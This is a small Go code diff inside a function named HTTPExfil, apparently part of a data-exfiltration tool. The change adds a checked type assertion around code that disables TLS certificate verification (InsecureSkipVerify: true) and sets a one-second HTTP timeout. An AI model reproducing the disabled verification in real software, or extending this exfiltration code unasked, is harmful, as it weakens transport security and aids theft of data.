@@ -137,7 +137,9 @@ func HTTPExfil(
 		var stream *bytes.Reader = bytes.NewReader(b)
 		var tmp [4 * 1024 * 1024]byte
 
-		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+		if t, ok := http.DefaultTransport.(*http.Transport); ok {
+			t.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+		}
 
 		// Set timeout to 1 second
 		http.DefaultClient.Timeout = time.Second
